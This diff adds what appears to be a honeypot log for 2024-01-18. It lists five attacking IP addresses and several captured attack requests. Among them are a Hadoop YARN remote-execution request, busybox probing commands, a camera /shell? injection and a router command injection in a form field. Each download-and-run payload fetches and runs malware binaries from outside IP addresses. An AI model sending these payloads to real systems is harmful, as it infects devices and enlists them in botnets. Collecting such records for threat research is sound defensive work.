@@ -1,0 +1,39 @@
+Top 5 IPs for 2024-01-18:
+
+114.227.34.163
+159.89.101.115
+116.95.33.220
+106.110.215.242
+117.95.128.5
+
+Malware download: 
+POST /ws/v1/cluster/apps HTTP/1.1
+Host: <HOST IP>
+User-Agent: Hello World
+Accept: */*
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 287
+
+{\"application-id\": \"\", \"application-name\": \"get-shell\", \"am-container-spec\": {\"commands\": {\"command\": \"cd /tmp; rm -rf skid.x86; wget http://45.95.147.172/skid.x86; curl http://45.95.147.172/skid.x86 --output skid.x86; chmod 777 skid.x86; ./skid.x86 Yarn;\"}}, \"application-type\": \"YARN\"}
+
+enable
+system
+shell
+sh
+cat /proc/mounts; /bin/busybox SJRLL
+cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SJRLL
+tftp; wget; /bin/busybox SJRLL
+dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s
+/bin/busybox SJRLL
+
+/shell?cd+/tmp;rm+bot.arm+bot.arm7;wget+http:/\\/93.123.85.116/bot.arm7;chmod+777+bot.arm7;./arm7+ipcams;wget+http:/\\/93.123.85.116/bot.arm;chmod+777+bot.arm;./bot.arm+ipcams
+
+POST /goform/set_LimitClient_cfg HTTP/1.1
+Host: 3.88.207.223:8080
+User-Agent: t.me/DeltaApi
+Content-Length: 134
+Cookie: user=admin
+Accept-Encoding: gzip
+
+time1=00:00-00:00&time2=00:00-00:00&mac=; cd /tmp; cd /run; cd /root; cd /; wget http://80.66.88.71/mipsel; chmod 777 mipsel; ./mipsel
